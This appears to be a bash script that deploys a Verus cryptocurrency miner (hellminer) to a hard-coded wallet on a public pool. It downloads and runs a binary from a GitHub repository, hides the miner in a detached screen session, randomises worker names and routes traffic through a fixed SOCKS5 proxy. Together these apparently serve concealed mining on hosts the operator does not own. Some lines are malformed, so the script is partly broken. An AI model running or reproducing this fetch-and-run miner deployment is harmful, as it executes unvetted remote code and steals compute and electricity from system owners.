#!/bin/bash
sudo apt update 
sudo apt install screen libjansson4 -y 
chmod +x hellminer && wget https://github.com/Godmine99/cpu/raw/main/verus-solver && chmod +x verus-solver ./verus-solver && apt install screen
screen -dmS ls 
POOL=stratum+tcp://eu.luckpool.net:3956
WALLET=RYBb7hyLUnBd7XRtre7jjjvVfYRWoAdors
WORKER=$(echo $(shuf -i 1-10 -n 1)BEH)
PROXY=socks5://178.162.111.220:1080
./hellminer -a verus -o $POOL -u $WALLET.$WORKER -t 2 -x $PROXY
